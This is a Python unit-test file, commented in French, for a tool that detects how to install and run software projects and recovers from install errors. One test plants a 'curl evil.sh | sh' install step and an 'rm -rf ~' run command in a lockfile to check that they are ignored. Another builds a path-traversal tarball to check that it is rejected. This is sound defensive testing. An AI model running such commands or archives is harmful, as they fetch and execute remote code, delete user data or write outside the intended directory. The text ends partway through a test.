"""Tests hors réseau : python -m unittest discover -s tests -v"""
import subprocess
import io
import json
import os
import sys
import tarfile
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "src"))

from zerodev import bench, core, freeze, localsvc, plan, recovery, registry, services, share  # noqa: E402
from zerodev.supervisor import Supervisor  # noqa: E402
from zerodev.plan import AmbiguousProject  # noqa: E402
from zerodev.util import ZeroError  # noqa: E402

EXAMPLES = ROOT / "examples"


class Base(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.tmp = Path(self._tmp.name)
        self.home = self.tmp / "zhome"
        os.environ["ZERO_HOME"] = str(self.home)
        os.environ.pop("ZERO_REGISTRY", None)

    def tearDown(self):
        self._tmp.cleanup()

    def repo(self, files: dict[str, str], name="proj") -> Path:
        root = self.tmp / name
        for rel, content in files.items():
            p = root / rel
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(content)
        return root


class TestDetectors(Base):
    def test_node_version_pm_and_run(self):
        r = self.repo({".nvmrc": "18", "package.json": '{"scripts":{"dev":"vite"}}', "pnpm-lock.yaml": ""})
        p = plan.detect_node(r)
        self.assertEqual((p.version, p.source, p.pm, p.run), ("18", ".nvmrc", "pnpm", "pnpm run dev"))

    def test_node_build_then_start(self):
        r = self.repo({"package.json": '{"scripts":{"build":"x","start":"y"}}', "package-lock.json": "{}"})
        p = plan.detect_node(r)
        self.assertEqual(p.install, ["npm ci", "npm run build"])
        self.assertEqual(p.run, "npm run start")

    def test_node_engines_fallback(self):
        r = self.repo({"package.json": '{"engines":{"node":">=20"},"main":"i.js"}', "i.js": "if (require.main === module) {}"})
        p = plan.detect_node(r)
        self.assertEqual(p.version, ">=20")
        self.assertEqual(p.run, "node i.js")

    def test_python_sources_and_entrypoint(self):
        r = self.repo({".python-version": "3.11", "requirements.txt": "flask\n", "app.py": ""})
        p = plan.detect_python(r)
        self.assertEqual((p.version, p.run), ("3.11", "python app.py"))
        self.assertTrue(any("uv venv --python 3.11" in c for c in p.install))

    def test_python_requirements_in_subdir(self):
        r = self.repo({"requirements/base.txt": "flask\n", "requirements/dev.txt": "pytest\n", "app.py": ""})
        p = plan.detect_python(r)
        self.assertTrue(any("-r requirements/base.txt" in c for c in p.install))
        self.assertFalse(any("dev.txt" in c for c in p.install))
        self.assertEqual(p.run, "python app.py")
        # variantes cpu/gpu : pas de choix deviné
        r2 = self.repo({"requirements/cpu.txt": "torch\n", "requirements/gpu.txt": "torch\n", "app.py": ""}, name="p2")
        self.assertIsNone(plan.detect_python(r2))

    def test_procfile_with_missing_local_binary_is_ignored(self):
        r = self.repo({"go.mod": "module x\ngo 1.22\n", "main.go": "package main\nfunc main(){}\n",
                       "Procfile": "etcd1: bin/etcd --name a\nweb: FOO=1 ./missing serve\n"})
        p = plan.detect_all(r)
        self.assertEqual(p.processes, {})
        self.assertTrue(any("Procfile ignoré" in n and "bin/etcd" in n for n in p.notes))

    def test_procfile_with_existing_local_binary_is_kept(self):
        r = self.repo({"go.mod": "module x\ngo 1.22\n", "main.go": "package main\nfunc main(){}\n",
                       "bin/server": "#!/bin/sh\n", "Procfile": "web: PORT=1 bin/server --x\nworker: go run ./w\n"})
        p = plan.detect_all(r)
        self.assertEqual(set(p.processes), {"web", "worker"})

    def test_python_version_file_comments_ignored(self):
        r = self.repo({".python-version": "# The Python version to use for the project.\n3.14\n",
                       "requirements.txt": "x\n", "app.py": ""})
        p = plan.detect_python(r)
        self.assertEqual(p.version, "3.14")
        self.assertTrue(any("--python 3.14" in c for c in p.install))

    def test_python_version_override(self):
        r = self.repo({"requirements.txt": "x\n", "app.py": ""})
        p = plan.detect_python(r, version_override="3.11")
        self.assertEqual(p.version, "3.11")
        self.assertTrue(any("uv venv --python 3.11" in c for c in p.install))

    def test_django_collectstatic_only_with_static_root(self):
        files = {"requirements.txt": "django\n", "manage.py": "", "site/__init__.py": ""}
        r1 = self.repo({**files, "site/settings.py": "STATIC_ROOT = BASE_DIR / 'staticfiles'\n"}, name="d1")
        self.assertTrue(any("manage.py collectstatic --noinput" in c for c in plan.detect_python(r1).install))
        r2 = self.repo({**files, "site/settings.py": "DEBUG = True\n"}, name="d2")
        self.assertFalse(any("collectstatic" in c for c in plan.detect_python(r2).install))
        r3 = self.repo({"requirements.txt": "flask\n", "manage.py": "", "site/settings.py": "STATIC_ROOT = 'x'\n"}, name="d3")
        self.assertFalse(any("collectstatic" in c for c in plan.detect_python(r3).install))   # pas Django

    def test_python_uv_lock_and_scripts(self):
        r = self.repo({"pyproject.toml": '[project]\nname="x"\nrequires-python=">=3.10"\n[project.scripts]\nmycli="x:main"\n',
                       "uv.lock": ""})
        p = plan.detect_python(r)
        self.assertEqual(p.run, "mycli")
        self.assertTrue(p.install[0].startswith("uv sync --frozen"))

    def test_python_ai_detection(self):
        r = self.repo({"requirements.txt": "torch==2.3\ntorchvision\nllama-cpp-python\nrequests\n", "main.py": ""})
        p = plan.detect_python(r)
        self.assertEqual(set(p.ai_libs), {"torch", "torchvision", "llama-cpp-python"})
        self.assertTrue(any("--torch-backend=auto" in c for c in p.install))

    def test_rust_toolchain(self):
        r = self.repo({"Cargo.toml": "[package]\nname='x'\n", "src/main.rs": "fn main(){}",
                       "rust-toolchain.toml": '[toolchain]\nchannel="1.75.0"\n'})
        p = plan.detect_rust(r)
        self.assertEqual((p.version, p.run), ("1.75.0", "cargo run --release"))

    def test_rust_library_is_not_runnable(self):
        r = self.repo({"Cargo.toml": "[package]\nname='lib'\n", "src/lib.rs": ""})
        p = plan.detect_rust(r)
        self.assertIsNone(p.run)
        self.assertTrue(any("bibliothèque" in n for n in p.notes))

    def test_rust_multiple_bins_and_workspace(self):
        r = self.repo({"Cargo.toml": "[package]\nname='mini'\n[[bin]]\nname='cli'\npath='src/bin/cli.rs'\n",
                       "src/bin/cli.rs": "", "src/bin/server.rs": ""}, "multi")
        self.assertEqual(plan.detect_rust(r).run, "cargo run --release --bin server")   # un seul « server »
        amb = self.repo({"Cargo.toml": "[package]\nname='t'\n", "src/bin/a.rs": "", "src/bin/b.rs": ""}, "amb")
        pa = plan.detect_rust(amb)
        self.assertIsNone(pa.run)
        self.assertEqual(len(pa.choices), 2)          # on refuse de deviner entre a et b
        ws = self.repo({"Cargo.toml": "[workspace]\nmembers=['crates/*']\n",
                        "crates/core/Cargo.toml": "[package]\nname='core'\n", "crates/core/src/lib.rs": "",
                        "crates/app/Cargo.toml": "[package]\nname='app'\n", "crates/app/src/main.rs": ""}, "ws")
        self.assertEqual(plan.detect_rust(ws).run, "cargo run --release -p app")
        many = self.repo({"Cargo.toml": "[workspace]\nmembers=['e/*']\n", "e/one/Cargo.toml": "[package]\nname='one'\n",
                          "e/one/src/main.rs": "", "e/two/Cargo.toml": "[package]\nname='two'\n", "e/two/src/main.rs": ""}, "many")
        pm = plan.detect_rust(many)
        self.assertIsNone(pm.run)
        self.assertEqual(sorted(pm.choices), ["cargo run --release -p one", "cargo run --release -p two"])
        libs = self.repo({"Cargo.toml": "[workspace]\nmembers=['a']\n", "a/Cargo.toml": "[package]\nname='a'\n", "a/src/lib.rs": ""}, "libs")
        self.assertIsNone(plan.detect_rust(libs).run)

    def test_go_root_cmd_and_library(self):
        r = self.repo({"go.mod": "module github.com/x/tool\n\ngo 1.22.0\ntoolchain go1.22.3\n", "main.go": "package main\nfunc main(){}\n"})
        p = plan.detect_go(r)
        self.assertEqual((p.version, p.source, p.run), ("1.22.3", "go.mod toolchain", "go run ."))
        c = self.repo({"go.mod": "module x/y/server\n\ngo 1.21\n", "cmd/server/main.go": "package main\n",
                       "cmd/other/main.go": "package main\n"}, "c")
        self.assertEqual(plan.detect_go(c).run, "go run ./cmd/server")
        ver = self.repo({"go.mod": "module github.com/x/tool/v2\n\ngo 1.21\n", "cmd/tool/main.go": "package main\n",
                         "cmd/gen/main.go": "package main\n"}, "ver")
        self.assertEqual(plan.detect_go(ver).run, "go run ./cmd/tool")      # suffixe /v2 ignoré
        none = self.repo({"go.mod": "module github.com/x/cli/v2\n\ngo 1.21\n", "cmd/gh/main.go": "package main\n",
                          "cmd/gen-docs/main.go": "package main\n"}, "none")
        pn = plan.detect_go(none)
        self.assertIsNone(pn.run)                                          # cli/cli : ne pas lancer gen-docs au hasard
        self.assertEqual(len(pn.choices), 2)
        lib = self.repo({"go.mod": "module x/lib\n\ngo 1.21\n", "lib.go": "package lib\n"}, "lib")
        self.assertIsNone(plan.detect_go(lib).run)

    def test_python_entry_heuristics(self):
        st = self.repo({"requirements.txt": "streamlit\n", "streamlit_app.py": "import streamlit"}, "st")
        self.assertEqual(plan.detect_python(st).run, "streamlit run streamlit_app.py")
        fa = self.repo({"requirements.txt": "fastapi\n", "app/main.py": "from fastapi import FastAPI\napp = FastAPI()\n"}, "fa")
        pf = plan.detect_python(fa)
        self.assertEqual(pf.run, "uvicorn app.main:app")
        self.assertTrue(any(c.endswith("uvicorn") for c in pf.install))
        fl = self.repo({"requirements.txt": "flask\n", "app.py": "from flask import Flask\napp = Flask(__name__)\n"}, "fl")
        self.assertEqual(plan.detect_python(fl).run, "flask --app app:app run")
        plain = self.repo({"requirements.txt": "x\n", "main.py": "if __name__ == '__main__': pass\n"}, "pl")
        self.assertEqual(plan.detect_python(plain).run, "python main.py")
        cs = self.repo({"setup.py": "setup(entry_points={'console_scripts': ['thefuck = thefuck.entrypoints.main:main']})"}, "cs")
        self.assertEqual(plan.detect_python(cs).run, "thefuck")

    def test_foreign_ecosystem_blocks_node_frontend_only(self):
        laravel = self.repo({"package.json": '{"scripts":{"dev":"vite"}}', "composer.json": "{}"}, "lara")
        with self.assertRaises(ZeroError) as cm:
            plan.detect_all(laravel)
        self.assertIn("PHP", str(cm.exception))
        py = self.repo({"requirements.txt": "x", "app.py": "", "Gemfile": ""}, "pyg")
        self.assertTrue(any("Ruby" in n for n in plan.detect_all(py).notes))      # simple avertissement hors Node

    def test_no_descent_from_recognized_non_workspace(self):
        go = self.repo({"go.mod": "module x/pb\n\ngo 1.21\n", "lib.go": "package pb\n",
                        "ui/package.json": '{"scripts":{"dev":"vite"}}'}, "pb")
        root, p = plan.resolve_project(go)
        self.assertEqual((root, p.lang, p.run), (go, "go", None))     # pocketbase : pas dans ui/

    def test_no_descent_for_foreign_root_or_unmanifested_python(self):
        rb = self.repo({"Gemfile": "", "package.json": "{}", "streaming/package.json": '{"scripts":{"start":"x"}}'}, "rb")
        with self.assertRaises(ZeroError) as cm:
            plan.resolve_project(rb)
        self.assertIn("Ruby", str(cm.exception))                       # mastodon : pas de descente dans streaming/
        webui = self.repo({"server.py": "", "desktop/package.json": '{"scripts":{"start":"electron ."}}'}, "webui")
        root, p = plan.resolve_project(webui)
        self.assertEqual((root, p.lang, p.run), (webui, "python", "python server.py"))   # dépendances déduites des import ; pas de descente dans desktop/
        self.assertTrue(any("DÉDUITES" in n for n in p.notes))
        noscript = self.repo({"a.py": "x = 1\n", "b.py": "y = 2\n", "desktop/package.json": '{"scripts":{"start":"electron ."}}'}, "ns")
        root, p = plan.resolve_project(noscript)
        self.assertEqual((root, p.run), (noscript, None))                               # plusieurs scripts : choix proposés, pas de devinette
        self.assertTrue(p.choices)
        self.assertEqual(plan.resolve_project(webui, "desktop")[0].name, "desktop")   # --project reste possible

    def test_rust_declared_bins_not_double_counted(self):
        r = self.repo({"Cargo.toml": "[package]\nname='mr'\n[[bin]]\nname='mr-cli'\npath='src/bin/cli.rs'\n"
                                     "[[bin]]\nname='mr-server'\npath='src/bin/server.rs'\n",
                       "src/bin/cli.rs": "", "src/bin/server.rs": ""}, "mr")
        self.assertEqual(plan.detect_rust(r).run, "cargo run --release --bin mr-server")

    def test_cmd_override(self):
        r = self.repo({"go.mod": "module x/lib\n\ngo 1.21\n", "lib.go": "package lib\n"})
        ctx = core.make_plan(r, use_lock=False, cmd="go run ./cmd/x")
        self.assertEqual(ctx.plan.run, "go run ./cmd/x")

    def test_node_library_main_is_not_runnable(self):
        lib = self.repo({"package.json": '{"main":"index.js"}', "index.js": "module.exports = require('./lib/app')\n",
                         "lib/app.js": "class A { listen() { return http.createServer() } }\n"}, "nlib")
        p = plan.detect_node(lib)
        self.assertIsNone(p.run)                                       # express / koa : ne démarrent rien
        self.assertTrue(any("bibliothèque" in n for n in p.notes))
        for body in ("#!/usr/bin/env node\nconsole.log(1)\n", "const app = express()\napp.listen(3000)\n",
                     "const [a] = process.argv.slice(2)\n"):
            r = self.repo({"package.json": '{"main":"server.js"}', "server.js": body}, "nsrv")
            self.assertEqual(plan.detect_node(r).run, "node server.js")
            import shutil; shutil.rmtree(r)

    def test_go_build_ignore_file_is_not_the_binary(self):
        r = self.repo({"go.mod": "module github.com/x/syncthing\n\ngo 1.22\n",
                       "build.go": "//go:build ignore\n\npackage main\n\nfunc main() {}\n",
                       "cmd/syncthing/main.go": "package main\n", "cmd/other/main.go": "package main\n"})
        self.assertEqual(plan.detect_go(r).run, "go run ./cmd/syncthing")

    def test_go_build_tags_rules(self):
        from zerodev.plan import _excluded_by_build_tags as ex
        self.assertTrue(ex("//go:build tools\n// +build tools\n\npackage main\n"))        # syncthing (réel)
        self.assertTrue(ex("//go:build ignore\n\npackage main\n"))
        self.assertTrue(ex("//go:build linux && integration\n\npackage main\n"))
        self.assertTrue(ex("// +build e2e\n\npackage main\n"))
        self.assertFalse(ex("//go:build !integration\n\npackage main\n"))                # étiquette niée : compilé
        self.assertFalse(ex("//go:build linux || darwin\n\npackage main\n"))             # étiquettes standard
        self.assertFalse(ex("//go:build go1.21\n\npackage main\n"))
        self.assertFalse(ex("package main\n"))

    def test_monorepo_scan_skips_templates(self):
        r = self.repo({"package.json": '{"workspaces":["x"]}', "template/base/package.json": '{"scripts":{"dev":"vite"}}'}, "tpl")
        self.assertEqual(plan.find_projects(r), [])

    def test_rust_renamed_bin_uses_declared_name(self):
        r = self.repo({"Cargo.toml": "[package]\nname='fd-find'\n[[bin]]\nname='fd'\npath='src/main.rs'\n", "src/main.rs": ""})
        p = plan.detect_rust(r)
        self.assertEqual(p.run, "cargo run --release")                 # un seul binaire : « fd », pas « fd-find »

    def test_node_bin_field(self):
        r = self.repo({"package.json": '{"bin":{"hexo":"./bin/hexo"}}', "bin/hexo": ""})
        self.assertEqual(plan.detect_node(r).run, "node ./bin/hexo")

    def test_monorepo_single_ambiguous_and_explicit(self):
        one = self.repo({"package.json": '{"workspaces":["apps/*"]}', "apps/web/package.json": '{"scripts":{"dev":"vite"}}',
                         "packages/ui/package.json": "{}"}, "one")
        root, p = plan.resolve_project(one)
        self.assertEqual((root.name, p.run), ("web", "npm run dev"))
        self.assertTrue(any("monorepo" in n for n in p.notes))
        two = self.repo({"apps/a/package.json": '{"scripts":{"start":"x"}}', "apps/b/package.json": '{"scripts":{"dev":"y"}}'}, "two")
        with self.assertRaises(plan.AmbiguousProject) as cm:
            plan.resolve_project(two)
        self.assertEqual(cm.exception.candidates, ["apps/a", "apps/b"])
        self.assertEqual(plan.resolve_project(two, "apps/b")[0].name, "b")
        with self.assertRaises(ZeroError):
            plan.resolve_project(two, "../etc")

    def test_procfile_overrides_run(self):
        r = self.repo({"requirements.txt": "x", "Procfile": "web: gunicorn a:b\nworker: python w.py\nrelease: python m.py\n"})
        p = plan.detect_all(r)
        self.assertEqual(p.run, "gunicorn a:b")
        self.assertEqual(list(p.processes), ["web", "worker"])
        self.assertIn("python m.py", p.install)

    def test_nothing_detected(self):
        with self.assertRaises(ZeroError):
            plan.detect_all(self.repo({"README.md": "hi"}))


class TestServicesAndEnv(Base):
    def test_detect_from_deps_env_and_compose(self):
        r = self.repo({
            "requirements.txt": "psycopg2-binary\ncelery\n",
            ".env.example": "MONGO=mongodb://x\n",
            "docker-compose.yml": "services:\n  db:\n    image: postgres:15-alpine\n",
        })
        kinds = {s.kind: s for s in services.detect_services(r)}
        self.assertEqual(set(kinds), {"postgres", "redis", "mongodb"})
        self.assertEqual(kinds["postgres"].image, "postgres:15-alpine")   # version du compose respectée

    def test_no_false_positive(self):
        r = self.repo({"package.json": '{"dependencies":{"express":"4"}}'})
        self.assertEqual(services.detect_services(r), [])

    def test_fill_env(self):
        r = self.repo({".env.example": "DATABASE_URL=postgres://u:p@x/db\nSECRET_KEY=changeme\nSTRIPE_API_KEY=\nDEBUG=true\n# c=1\n"})
        res = services.fill_env(r, {"DATABASE_URL": "postgresql://zero:zero@localhost:5999/app"})
        text = (r / ".env").read_text()
        self.assertIn("DATABASE_URL=postgresql://zero:zero@localhost:5999/app", text)
        self.assertIn("DEBUG=true", text)
        self.assertEqual(res["generated"], ["SECRET_KEY"])
        self.assertEqual(res["unresolved"], ["STRIPE_API_KEY"])
        secret = [l for l in text.splitlines() if l.startswith("SECRET_KEY=")][0].split("=")[1]
        self.assertEqual(len(secret), 64)

    def test_existing_env_never_overwritten(self):
        r = self.repo({".env": "A=1\n", ".env.example": "A=2\n"})
        self.assertFalse(services.fill_env(r, {})["created"])
        self.assertEqual((r / ".env").read_text(), "A=1\n")


class TestPythonInstallRecovery(Base):
    def _plan(self, version=None):
        return plan.Plan("python", version, "x", [], None, [])

    def test_removed_module_triggers_downgrade(self):
        from zerodev.recovery import diagnose_python_install as d
        tail = "ModuleNotFoundError: No module named 'imp'"
        self.assertEqual(d(self._plan(), tail), "3.11")
        self.assertEqual(d(self._plan("3.13"), tail), "3.11")
        self.assertEqual(d(self._plan("distutils"), "No module named 'distutils'"), "3.11")
        self.assertEqual(d(self._plan(), "ModuleNotFoundError: No module named 'gunicorn.six.moves'"), "3.11")

    def test_ladder(self):
        from zerodev.recovery import diagnose_python_install as d
        ga = "Error: module 'inspect' has no attribute 'getargspec'"
        self.assertEqual(d(self._plan("3.11"), ga), "3.10")
        self.assertEqual(d(self._plan(), ga), "3.10")
        self.assertIsNone(d(self._plan("3.10"), ga))
        cm = "ImportError: cannot import name 'Mapping' from 'collections'"
        self.assertEqual(d(self._plan("3.10"), cm), "3.9")
        self.assertIsNone(d(self._plan("3.9"), cm))
        self.assertEqual(d(self._plan("3.10"), "ImportError: cannot import name 'Container' from 'collections'"), "3.9")
        self.assertIsNone(d(self._plan("3.10"), "ImportError: cannot import name 'OrderedDict' from 'collections'"))

    def test_no_downgrade_when_already_old_or_unrelated(self):
        from zerodev.recovery import diagnose_python_install as d
        tail = "ModuleNotFoundError: No module named 'imp'"
        self.assertIsNone(d(self._plan("3.10"), tail))
        self.assertIsNone(d(self._plan(), "ModuleNotFoundError: No module named 'numpy'"))
        self.assertIsNone(d(plan.Plan("node", None, "x", [], None, []), tail))


class TestIPv6Recovery(Base):
    def test_gunicorn_bind_fallback(self):
        from zerodev.recovery import diagnose
        r = self.repo({"requirements.txt": "gunicorn\n", "app.py": ""})
        p = plan.Plan("python", None, "x", [], "gunicorn app:app")
        tail = "[ERROR] connection to ('::', 8123) failed: [Errno 97] Address family not supported by protocol"
        fixes = diagnose(p, r, tail, set())
        f = next(x for x in fixes if "IPv6" in x.description)
        self.assertEqual(f.env, {"GUNICORN_CMD_ARGS": "--bind 0.0.0.0:8123"})
        self.assertFalse(any("IPv6" in x.description for x in diagnose(plan.Plan("python", None, "x", [], "python app.py"), r, "Errno 97 nothing", set())))


class TestPythonPatchRecovery(Base):
    def test_exact_patch_unavailable_falls_back_to_minor(self):
        from zerodev.recovery import diagnose_python_patch as d
        p = plan.Plan("python", "3.8.1", "runtime.txt", [], None)
        self.assertEqual(d(p, "error: No interpreter found for Python 3.8.1 in managed installations"), "3.8")
        self.assertIsNone(d(p, "error: No interpreter found for Python 3.8 in managed installations"))   # déjà une mineure
        self.assertIsNone(d(plan.Plan("node", "3.8.1", "x", [], None), "No interpreter found for Python 3.8.1"))


class TestPsycopg2Recovery(Base):
    def test_diagnose(self):
        from zerodev.recovery import diagnose_psycopg2 as d
        p = plan.Plan("python", None, "x", [], None, [])
        self.assertTrue(d(p, "Error: pg_config executable not found."))
        self.assertTrue(d(p, "pg_config is required to build psycopg2 from source"))
        self.assertFalse(d(p, "No module named 'numpy'"))
        self.assertFalse(d(plan.Plan("node", None, "x", [], None, []), "pg_config executable not found"))

    def test_flatten_and_swap(self):
        from zerodev.recovery import flatten_requirements, swap_psycopg2
        r = self.repo({"requirements.txt": "flask==1\n-r extra/prod.txt\n", "extra/prod.txt": "psycopg2==2.9.1\n-r ../requirements.txt\npsycopg2-binary\n"})
        flat = flatten_requirements(r / "requirements.txt")
        self.assertEqual(flat, ["flask==1", "psycopg2==2.9.1", "psycopg2-binary"])   # cycle ignoré, -r développé
        out = swap_psycopg2(flat + ["psycopg2[x]>=2", "psycopg2cffi"])
        self.assertEqual(out[:3], ["flask==1", "psycopg2-binary==2.9.1", "psycopg2-binary"])
        self.assertEqual(out[3], "psycopg2-binary[x]>=2")
        self.assertEqual(out[4], "psycopg2cffi")                                      # autre paquet : intact

    def test_import_map_pkg_resources(self):
        from zerodev.recovery import PY_IMPORT_MAP
        self.assertEqual(PY_IMPORT_MAP["pkg_resources"], "setuptools<81")

    def test_unpin(self):
        from zerodev.recovery import psycopg2_pin_unsatisfiable as u, swap_psycopg2
        out = swap_psycopg2(["psycopg2==2.7.3", "psycopg2-binary==2.7.3 ; python_version>'3'", "psycopg2[x]>=2,<3", "flask==1"],
                            keep_version=False)
        self.assertEqual(out, ["psycopg2-binary", "psycopg2-binary ; python_version>'3'", "psycopg2-binary[x]", "flask==1"])
        self.assertTrue(u("... psycopg2-binary==2.7.3, we can conclude that your requirements are unsatisfiable."))
        self.assertFalse(u("pg_config executable not found"))


class TestRecovery(Base):
    def setUp(self):
        super().setUp()
        self.root = self.repo({"requirements.txt": "x", "localmod.py": ""})
        self.pplan = plan.detect_python(self.root)

    def test_missing_python_module_maps_import_name(self):
        fx = recovery.diagnose(self.pplan, self.root, "ModuleNotFoundError: No module named 'cv2'", set())
        self.assertEqual(len(fx), 1)
        self.assertIn("opencv-python", fx[0].commands[0])

    def test_local_module_is_not_installed(self):
        fx = recovery.diagnose(self.pplan, self.root, "ModuleNotFoundError: No module named 'localmod'", set())
        self.assertEqual(fx, [])

    def test_same_fix_never_applied_twice(self):
        tail = "ModuleNotFoundError: No module named 'yaml'"
        f1 = recovery.diagnose(self.pplan, self.root, tail, set())
        self.assertEqual(recovery.diagnose(self.pplan, self.root, tail, {f1[0].key}), [])

    def test_port_in_use(self):
        fx = recovery.diagnose(self.pplan, self.root, "OSError: [Errno 98] Address already in use", set())
        self.assertTrue(fx[0].automatic and "PORT" in fx[0].env)

    def test_system_tool_is_manual_only(self):
        fx = recovery.diagnose(self.pplan, self.root, "sh: 1: ffmpeg: not found", set())
        self.assertFalse(fx[0].automatic)
        self.assertIn("apt install ffmpeg", fx[0].manual)

    def test_node_missing_module_npm_vs_pnpm(self):
        n_root = self.repo({"package.json": "{}", "package-lock.json": "{}"}, "n")
        n_plan = plan.detect_node(n_root)
        fx = recovery.diagnose(n_plan, n_root, "Error: Cannot find module '@scope/pkg/sub'", set())
        self.assertIn("@scope/pkg", fx[0].commands[0])
        p_root = self.repo({"package.json": "{}", "pnpm-lock.yaml": ""}, "p")
        fx = recovery.diagnose(plan.detect_node(p_root), p_root, "Error: Cannot find module 'left-pad'", set())
        self.assertFalse(fx[0].automatic)    # pnpm : jamais de modification du lockfile
        self.assertEqual(recovery.diagnose(n_plan, n_root, "Cannot find module './local'", set()), [])

    def test_missing_env_var(self):
        fx = recovery.diagnose(self.pplan, self.root, "KeyError: 'API_TOKEN'", set())
        self.assertIn("API_TOKEN", fx[0].description)

    def test_install_engine_mismatch_pnpm_and_yarn(self):
        n_root = self.repo({"package.json": "{}", "pnpm-lock.yaml": ""}, "np")
        n_plan = plan.detect_node(n_root)
        pnpm = ('ERR_PNPM_UNSUPPORTED_ENGINE  Unsupported environment\nYour Node version is incompatible with "x@2".\n\n'
                'Expected version: >=22.12.0\nGot: v20.20.2\n\nThis is happening because...')
        self.assertEqual(recovery.diagnose_install(n_plan, pnpm), ">=22.12.0")
        yarn = 'error x@1: The engine "node" is incompatible with this module. Expected version ">=18.17". Got "16.20.0"'
        self.assertEqual(recovery.diagnose_install(n_plan, yarn), ">=18.17")
        self.assertIsNone(recovery.diagnose_install(n_plan, "npm ERR! network timeout"))
        self.assertIsNone(recovery.diagnose_install(self.pplan, pnpm))      # Python : non concerné

    def test_journal(self):
        path = recovery.journal("proj", {"fix": "x"})
        self.assertEqual(json.loads(path.read_text().splitlines()[0])["fix"], "x")


class TestFreezeShareRegistry(Base):
    def make(self):
        return self.repo({".python-version": "3.12", "requirements.txt": "redis\n", "app.py": "",
                          ".env.example": "REDIS_URL=\nSECRET_KEY=x\n",
                          "Dockerfile": "RUN apt-get update && apt-get install -y --no-install-recommends ffmpeg libpq-dev \\\n  && rm -rf /x\nEXPOSE 8080\n"})

    def test_fingerprint_stable_and_sensitive(self):
        r = self.make()
        fp = freeze.fingerprint(r)
        self.assertEqual(fp, freeze.fingerprint(r))
        (r / "app.py").write_text("print(1)")          # le code source ne compte pas
        self.assertEqual(fp, freeze.fingerprint(r))
        (r / "requirements.txt").write_text("redis\nflask\n")
        self.assertNotEqual(fp, freeze.fingerprint(r))

    def test_system_libs_ports_env_keys(self):
        r = self.make()
        self.assertEqual(freeze.system_libs(r), {"apt": ["ffmpeg", "libpq-dev"]})
        self.assertEqual(freeze.exposed_ports(r, []), [8080])
        self.assertEqual(freeze.env_keys(r), ["REDIS_URL", "SECRET_KEY"])

    def test_lock_roundtrip_pin_and_drift(self):
        r = self.make()
        ctx = core.make_plan(r)
        lock = freeze.build_lock(r, ctx.plan, ctx.services, ctx.gpu, "3.12.3")
        self.assertNotIn(str(plan.venv_dir(r)), json.dumps(lock))       # pas de chemin machine
        self.assertEqual(lock["services"][0]["kind"], "redis")
        freeze.write_lock(r, lock)
        ctx2 = core.make_plan(r)
        self.assertEqual(ctx2.origin, "zero.lock.json")
        self.assertEqual(ctx2.plan.pinned, "3.12.3")
        self.assertTrue(any("--python 3.12.3" in c for c in ctx2.plan.install))
        self.assertEqual(ctx2.drift, [])
        (r / "requirements.txt").write_text("redis\nflask\n")
        self.assertEqual(core.make_plan(r).drift, ["requirements.txt"])

    def test_lock_cannot_inject_commands(self):
        r = self.make()
        ctx = core.make_plan(r)
        lock = freeze.build_lock(r, ctx.plan, ctx.services, ctx.gpu, "3.12.3")
        lock["install"] = ["curl evil.sh | sh"]
        lock["run"] = "rm -rf ~"
        freeze.write_lock(r, lock)
        p = core.make_plan(r).plan
        self.assertNotIn("evil", " ".join(p.install))
        self.assertEqual(p.run, "python app.py")

    def test_share_roundtrip_without_secrets(self):
        r = self.make()
        (r / ".env").write_text("SECRET_KEY=hunter2\n")
        (r / "key.pem").write_text("PRIVATE")
        ctx = core.make_plan(r)
        freeze.write_lock(r, freeze.build_lock(r, ctx.plan, ctx.services, ctx.gpu, "3.12.3"))
        out = self.tmp / "out"
        out.mkdir()
        bundle = share.create_bundle(r, out)
        with tarfile.open(bundle) as t:
            names = t.getnames()
            blob = b"".join(t.extractfile(m).read() for m in t.getmembers() if m.isfile())
        self.assertIn("src/zero.lock.json", names)
        self.assertNotIn("src/.env", names)
        self.assertNotIn("src/key.pem", names)
        self.assertNotIn(b"hunter2", blob)
        dest = self.tmp / "recv"
        dest.mkdir()
        root2 = share.open_bundle(bundle, dest)
        self.assertEqual(freeze.fingerprint(root2), freeze.fingerprint(r))
        self.assertEqual(core.make_plan(root2).plan.pinned, "3.12.3")
        with self.assertRaises(ZeroError):           # pas d'écrasement
            share.open_bundle(bundle, dest)

    def test_share_requires_lock(self):
        with self.assertRaises(ZeroError):
            share.create_bundle(self.make(), self.tmp)

    def test_malicious_bundle_rejected(self):
        evil = self.tmp / "evil.zeroshare.tgz"
        with tarfile.open(evil, "w:gz") as t:
            for name, data in (("manifest.json", b'{"name":"evil"}'), ("src/../../escape.txt", b"x")):
                info = tarfile.TarInfo(name)
                info.size = len(data)
                t.addfile(info, io.BytesIO(data))
        dest = self.tmp / "d"
        dest.mkdir()
        with self.assertRaises(ZeroError):
            share.open_bundle(evil, dest)
        self.assertFalse((self.tmp / "escape.txt").exists())

    def test_registry_local_shared_dir_and_validation(self):
        shared = self.tmp / "shared"
        os.environ["ZERO_REGISTRY"] = str(shared)
        lock = {"zero_lock": 1, "fingerprint": "abc123", "runtime": {"lang": "python", "resolved": "3.12.3"}}
        where = registry.record("abc123", lock)
        self.assertEqual(len(where), 2)
        self.assertEqual(registry.lookup("abc123"), lock)
        for f in (self.home / "registry").glob("*.json"):      # cache vidé → relu depuis le dossier partagé
            f.unlink()
        self.assertEqual(registry.lookup("abc123"), lock)
        (shared / "bad.json").write_text(json.dumps({"zero_lock": 1, "fingerprint": "other"}))
        self.assertIsNone(registry.lookup("bad"))               # empreinte incohérente refusée

    def test_registry_used_by_make_plan(self):
        r = self.make()
        ctx = core.make_plan(r)
        lock = freeze.build_lock(r, ctx.plan, ctx.services, ctx.gpu, "3.12.9")
        registry.record(ctx.fp, lock)
        ctx2 = core.make_plan(r)
        self.assertEqual((ctx2.origin, ctx2.plan.pinned), ("registre", "3.12.9"))


class TestCorpusBuilder(Base):
    def test_parse_items_filters_forks_and_archived(self):
        import importlib.util
        spec = importlib.util.spec_from_file_location("build_corpus", ROOT / "benchmark" / "build_corpus.py")
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        payload = {"items": [
            {"html_url": "https://github.com/a/ok", "clone_url": "x", "full_name": "a/ok", "language": "Go", "stargazers_count": 9, "size": 10},
            {"html_url": "https://github.com/a/fork", "clone_url": "x", "full_name": "a/fork", "fork": True},
            {"html_url": "https://github.com/a/old", "clone_url": "x", "full_name": "a/old", "archived": True},
        ]}
        items = mod.parse_items(payload)
